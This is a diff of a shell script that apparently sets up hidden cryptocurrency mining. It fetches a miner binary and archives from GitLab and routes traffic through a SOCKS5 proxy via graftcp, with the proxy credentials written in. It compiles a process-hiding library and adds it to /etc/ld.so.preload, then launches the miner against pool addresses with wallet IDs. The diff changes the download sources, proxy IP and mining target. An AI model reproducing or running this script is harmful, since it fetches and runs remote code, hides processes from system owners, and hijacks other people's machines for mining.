@@ -17,7 +17,7 @@ wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.81
 
 chmod 777 lol1.81
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
+wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
@@ -25,7 +25,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 159.65.189.192:443
+socks5 = 137.184.215.93:443
 socks5_username = majapahlevi
 socks5_password = majapahlevi
 END
@@ -50,13 +50,12 @@ echo " "
 echo " "
 
 
-./graftcp/graftcp wget https://gitlab.com/majapahlevi/mvp/-/raw/main/magicBezzHash.zip
+./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
 unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 64.23.198.64:443 -u pyrin:qz5mu36m6hy997g3ytu92rwlhr3exvpdhyke3vhmak02lxc9n7xxkcrac36jx.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl 
-
+./graftcp/graftcp & clear & ./lol1.81 -a KARLSENV2 -p 165.232.165.31:80 -u karlsen:qqm2xqewxe9mpl3xexd4gpq6j2gtf2l92wnktf62079deqry9v456c0n274uk.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl 
 
